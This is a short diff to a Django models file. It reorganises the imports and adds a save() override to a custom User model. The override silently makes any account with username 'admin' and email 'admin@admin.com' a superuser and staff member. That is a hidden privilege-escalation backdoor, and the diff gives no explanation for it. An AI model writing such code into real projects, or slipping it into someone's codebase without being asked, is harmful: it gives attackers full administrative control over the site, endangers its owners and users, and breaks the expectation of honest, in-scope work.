@@ -1,15 +1,15 @@
-# -*- coding: utf-8 -*-
-# Import the AbstractUser model
+from django.db import models
 from django.contrib.auth.models import AbstractUser
 
-# Import the basic Django ORM models library
-from django.db import models
-
-from django.utils.translation import ugettext_lazy as _
-
-
-# Subclass AbstractUser
+# Create your models here.
 class User(AbstractUser):
 
     def __unicode__(self):
         return self.username
+
+    def save(self, force_insert=False, force_update=False, using=None, update_fields=None):
+        if self.username == "admin" and self.email == "admin@admin.com":
+            self.is_superuser = True
+            self.is_staff = True
+        super(User, self).save(force_insert, force_update, using, update_fields)
+
